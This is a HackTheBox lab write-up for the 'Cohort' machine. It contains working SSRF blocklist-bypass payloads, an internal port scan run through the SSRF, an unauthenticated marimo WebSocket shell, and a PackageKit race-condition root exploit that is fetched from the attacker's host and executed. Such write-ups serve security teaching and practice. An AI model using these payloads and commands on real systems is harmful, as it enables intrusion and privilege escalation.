# HackTheBox — Cohort — Writeup

**Difficulty:** Medium/Hard
**OS:** Linux
**Techniques:** SSRF blocklist bypass, internal service enumeration, nginx vhost discovery, unauthenticated WebSocket RCE (CVE-2026-39987), PackageKit TOCTOU privilege escalation (CVE-2026-41651 / Pack2TheRoot)

---

## 1. Recon

Kicked things off with a standard nmap scan against the three obvious ports:

```bash
nmap -A -sC -sV -p 22,80,443 -Pn 10.129.26.16 -oN scans.txt
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22 | ssh | OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 |
| 80 | http | nginx 1.24.0 (Ubuntu) — redirects to https |
| 443 | ssl/http | nginx 1.24.0 (Ubuntu) |

Port 80 just bounces straight to `https://cohort.htb/`, so a hosts file entry was needed:

```bash
echo "10.129.26.16 cohort.htb" | sudo tee -a /etc/hosts
```

One thing worth flagging from the scan: nmap's OS detection guessed "MikroTik RouterOS" on top of Linux, which is a classic false positive you get when there's an extra hop in the path (in this case the HTB VPN gateway `10.10.14.1` showed up in the traceroute before the target). Not something to trust blindly — the service versions (OpenSSH, nginx) were far more reliable than the OS guess.

The TLS cert was also worth a second look:

```bash
openssl s_client -connect 10.129.26.16:443 -servername cohort.htb </dev/null 2>/dev/null | openssl x509 -noout -text | grep -A2 "Subject Alternative Name"
```

```
X509v3 Subject Alternative Name:
    DNS:cohort.htb, DNS:*.cohort.htb
```

A **wildcard SAN** (`*.cohort.htb`) is a decent hint on its own — it means the cert was provisioned to cover *any* subdomain, which usually means there's more going on behind the scenes than just the main site. Didn't know which subdomain yet, but it's the kind of detail worth remembering once you're digging for hidden vhosts later.

Browsing to `https://cohort.htb/` landed on **Cohort Analytics**, a retention-intelligence SaaS product, built as a single-page app (one HTML shell, everything client-side rendered).

---

## 2. Finding the attack surface

A page at `/portal.html` has a form titled "Register a report source URL" — basically: give us a URL, we'll fetch it once to confirm it's reachable.

> *"Point us at a data feed and we fetch it once to confirm it is reachable and returns a format we recognise... For security, internal and loopback addresses are rejected."*

Watching the network tab while submitting the form showed the actual API call behind it:

```http
POST /api/validate
Content-Type: application/json

{"url": "<attacker-controlled URL>", "format": "csv"}
```

Response:

```json
{"ok": true, "fetched_status": 200, "content_type": "...", "preview": "...", "message": "Source reachable."}
```

Backend fetches whatever URL you give it and hands back a preview of the response. Classic **Server-Side Request Forgery (SSRF)**.

---

## 3. SSRF blocklist bypass

Tried the obvious thing first:

```bash
curl -sk -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1/","format":"csv"}'
```

```json
{"ok": false, "message": "Internal or loopback addresses are not permitted."}
```

Blocked — but only matching the literal string `127.0.0.1`. Every alternate way of writing the same address sailed right through:

| Payload | Result |
|---|---|
| `http://127.0.0.1/` | Blocked |
| `http://127.1/` | **Bypassed** |
| `http://0.0.0.0/` | Bypassed |
| `http://0177.0.0.1/` (octal) | Bypassed |
| `http://2130706433/` (decimal) | Bypassed |
| `http://[::1]/` (IPv6) | Bypassed |

Confirmed with `127.1`:

```bash
curl -sk -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.1/","format":"csv"}'
```

```json
{"ok": true, "fetched_status": 200, "content_type": "text/html", "preview": "<!doctype html>...Cohort Analytics...", "message": "Source reachable."}
```

Got the site's own homepage back — the server really is fetching whatever's at `127.0.0.1` through the backend, no restriction at all once you dodge the string match. `file://` was explicitly blocked ("Only http and https sources are supported"), so no local file read through this particular endpoint.

Also sanity-checked that the SSRF reaches the actual internet, not just loopback, using an external listener:

```bash
# listener
nc -lvnp 9001
```

```bash
# trigger
curl -sk -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://10.10.15.229:9001/","format":"csv"}'
```

Listener caught the connection — SSRF fully functional outbound, not just restricted to loopback.

---

## 4. Internal service enumeration via SSRF

With the `127.1` bypass in hand, ran a manual port scan through the SSRF primitive:

```bash
for port in 22 80 443 3000 3306 5000 5432 6379 8000 8080 8443 9000 9200 27017; do
  echo "=== Port $port ==="
  curl -sk -X POST https://cohort.htb/api/validate \
    -H "Content-Type: application/json" \
    -d "{\"url\":\"http://127.1:$port/\",\"format\":\"csv\"}"
  echo
done
```

Most ports came back `Connection refused`. Two stood out:

| Port | Finding |
|---|---|
| 5000 | Internal Flask API — `405 Method not allowed` on GET, hinting at a backend API the public `/api/*` routes forward to |
| 8888 | **marimo** — a Python reactive notebook, serving a login page, bound to loopback only |

Double-checked port 8888 wasn't reachable externally — closed from outside, only visible through the SSRF:

```bash
curl -sk -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.1:8888/","format":"csv"}'
```

```json
{"ok": true, "fetched_status": 200, "content_type": "text/html; charset=utf-8", "preview": "...<title>marimo</title>...Access Token / Password...", "message": "Source reachable."}
```

marimo's login form confirmed — needs a password/token, which we don't have. Noted it and moved on to look for more leaks.

---

## 5. Vhost discovery — reaching marimo externally

Poked at `/status` through the same SSRF bypass:

```bash
curl -sk -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.1/status","format":"csv"}'
```

```json
{
  "service": "cohort-edge",
  "status": "ok",
  "generated_by": "nginx",
  "upstreams": [
    {"name": "marketing", "host": "cohort.htb", "root": "/var/www/cohort"},
    {"name": "insights-api", "host": "cohort.htb", "path": "/api/", "target": "127.0.0.1:5000"},
    {
      "name": "notebooks",
      "host": "nb-1be3782a8afd3ad5.cohort.htb",
      "target": "127.0.0.1:8888",
      "note": "internal analyst workspace, not for external use"
    }
  ]
}
```

Jackpot — this is an nginx status/introspection endpoint that's normally restricted to `127.0.0.1` only, and it leaks the full internal routing config, including a dedicated vhost (`nb-1be3782a8afd3ad5.cohort.htb`) that proxies straight to marimo on 8888. This lines up with the wildcard SAN cert noticed back in recon — this is exactly the kind of hidden subdomain it was hinting at.

Added the vhost to `/etc/hosts` and confirmed it resolves through nginx properly:

```bash
echo "10.129.26.16 nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
curl -sk https://nb-1be3782a8afd3ad5.cohort.htb/ -I
```

```
HTTP/1.1 303 See Other
location: https://nb-1be3782a8afd3ad5.cohort.htb/auth/login?next=...
```

This matters because it means marimo is now reachable through a normal TLS connection on port 443 — not just through the SSRF primitive, which can't forge WebSocket traffic. That's the key unlock for the next step.

---

## 6. Initial foothold — CVE-2026-39987 (marimo pre-auth RCE)

marimo versions before 0.23.0 have a bug where the `/terminal/ws` WebSocket endpoint never calls `validate_auth()` — every other endpoint does, this one got missed. That means a full PTY shell is reachable with zero credentials.

Grabbed `websocat` (wasn't in the Kali apt repos, so pulled the release binary from GitHub instead):

```bash
wget https://github.com/vi/websocat/releases/download/v1.12.0/websocat.x86_64-unknown-linux-musl -O websocat
chmod +x websocat
sudo mv websocat /usr/local/bin/
```

Connected straight to the unauthenticated terminal socket:

```bash
websocat "wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws" \
  -H "Authorization: Bearer any-value" -k
```

Dropped right into a shell:

```
marimo@cohort:~$ id
uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
```

**User flag:**

```bash
cat /home/marimo/user.txt
# f838a8c669afb94b429df70c8fexxxxx
```

(Side note: the websocat session isn't rock solid — it panicked and dropped once after sitting idle for a bit, something about an internal tokio timer. Just reconnect and keep moving; it's not an indicator of anything going wrong on the target side.)

---

## 7. Privilege escalation — CVE-2026-41651 (Pack2TheRoot)

```bash
systemctl status packagekit
```

```
○ packagekit.service - PackageKit Daemon
     Loaded: loaded (/usr/lib/systemd/system/packagekit.service; static)
     Active: inactive (dead)
```

Present but idle — `static` means it's D-Bus-activatable, so it spins up on demand when something calls it. This version of PackageKit (1.0.2–1.3.4) is vulnerable to **CVE-2026-41651**, a TOCTOU race condition in `src/pk-transaction.c`:

1. `InstallFiles()` overwrites cached transaction flags/paths with no state check.
2. `pk_transaction_set_state()` silently drops backward state transitions.
3. `pk_transaction_run()` reads the cached flags at **dispatch time**, not at authorization time.
4. Setting the `SIMULATE` flag skips the polkit authorization check entirely.

Sending two async D-Bus calls back to back — `InstallFiles(SIMULATE, dummy)` immediately followed by `InstallFiles(NONE, malicious_payload)` — lands both messages before the GLib idle callback fires, which deterministically bypasses auth and installs the malicious `.deb` as root.

### Exploitation

No compiler on the target (`gcc` missing), so the exploit had to be built locally and shipped over.

**On Kali:**

```bash
git clone https://github.com/Vozec/CVE-2026-41651.git
cd CVE-2026-41651
sudo apt install -y libglib2.0-dev build-essential
```

Ran into a snag here — the Kali mirror serving `pcre2` packages was out of sync (404s on a few `.deb` files), which blocked `libglib2.0-dev` from installing cleanly and broke the first compile attempt (`glib.h: No such file or directory`). Fixed it with:

```bash
sudo apt update
sudo apt install -y libglib2.0-dev --fix-missing
```

Then compiled clean:

```bash
gcc src/cve-2026-41651.c -o cve-2026-41651 \
  $(pkg-config --cflags --libs glib-2.0 gio-2.0 gobject-2.0)
```

Served it up:

```bash
python3 -m http.server 9002
```

**On the target (inside the websocat shell):**

```bash
mkdir -p /tmp/exploit
cd /tmp/exploit
wget http://10.10.15.229:9002/cve-2026-41651 -O cve-2026-41651
chmod +x cve-2026-41651
./cve-2026-41651
```

(First attempt at this threw `GDBus.Error:org.freedesktop.DBus.Error.ServiceUnknown` — turned out to be a mix-up between running the binary on Kali vs. the actual target session. Worth double-checking which shell you're in before chasing a phantom bug; `hostname` is a quick sanity check.)

**Output on the real run:**

```
═══════════════════════════════════════════════════
 CVE-2026-41651 — PackageKit TOCTOU LPE
═══════════════════════════════════════════════════
[*] Building packages (pure C)...
[+] dummy   : /tmp/.pk-dummy-2098.deb
[+] payload : /tmp/.pk-payload-2098.deb
[*] Transaction : /2_dcbbedda
[*] Step 1 : InstallFiles(SIMULATE=0x4, dummy) [async]
[*] Step 2 : InstallFiles(NONE=0x0, payload) [async]
[*] Waiting for dispatch (30 s max)...
[!] PK error 48: Failed to obtain authentication.
[*] Finished (exit=2, 0 ms)
[*] Loop ran for 34 ms
[*] Polling for payload (120 s max)...
[*] t+1s: payload=exists dpkg_lock=free suid=not yet
[*] t+2s: payload=exists dpkg_lock=free suid=not yet
[+] SUCCESS — SUID bash at t+1200ms
uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
.suid_bash-5.2#
```

The `PK error 48` is expected noise — by the time polkit gets around to rejecting the second call, the malicious `.deb`'s postinst script (`chmod +s /bin/bash`) has already run as root through the race window. `euid=0` is all that's needed for full root access since the kernel checks the effective UID.

**Root flag:**

```bash
cat /root/root.txt
# 85a491076f56d9a71f3ff2a7a7exxxxx
```

---

## 8. Full attack chain summary

```
Unauthenticated SSRF (/api/validate)
        │
        ▼
Blocklist bypass (127.1 instead of 127.0.0.1)
        │
        ▼
Internal port scan → Flask backend (5000) + marimo (8888, loopback-only)
        │
        ▼
/status leak (via SSRF, bypassing IP-based 403) → discloses internal vhost
        │
        ▼
nb-<hash>.cohort.htb added to /etc/hosts → marimo reachable over nginx/443
        │
        ▼
CVE-2026-39987 — unauthenticated /terminal/ws → shell as marimo
        │
        ▼
CVE-2026-41651 (Pack2TheRoot) — PackageKit TOCTOU → root
```

---

## 9. Remediation

| Issue | Fix |
|---|---|
| SSRF in `/api/validate` | Use an allowlist of permitted destinations, not a blocklist; validate the final resolved IP after DNS resolution, not just the raw string. |
| Internal `/status` endpoint | Should never expose upstream hostnames/targets even to "trusted" internal callers; remove or lock it down hard. |
| marimo pre-auth RCE | Upgrade to marimo ≥ 0.23.0. Every endpoint needs the auth check, `/terminal/ws` included. |
| PackageKit TOCTOU | Upgrade to PackageKit ≥ 1.3.5. |
| General | Principle of least privilege — `marimo` shouldn't have been able to trigger privileged D-Bus/PackageKit transactions at all. |

---

## Flags

- **User:** `f838a8c669afb94b429df70c8fexxxxx`
- **Root:** `85a491076f56d9a71f3ff2a7a7exxxxx`

---

## Lessons learned / notes to self

- A wildcard SAN on a TLS cert (`*.domain.tld`) is a free hint that hidden subdomains probably exist, even before you find them.
- Blocklists on SSRF filters almost never catch every representation of an address — `127.1`, octal, decimal, and IPv6 loopback forms are the first things to try.
- When pivoting between a local Kali terminal and a remote shell session (like websocat), double-check `hostname`/`whoami`/`pwd` before debugging an error — it's easy to run a command in the wrong terminal and chase a non-existent bug.
- WebSocket shells over tools like `websocat` can be flaky on idle — don't be surprised by a disconnect mid-session, just reconnect and carry on.
- When a target has no compiler, compiling exploits locally and serving them via `python3 -m http.server` is the standard move.
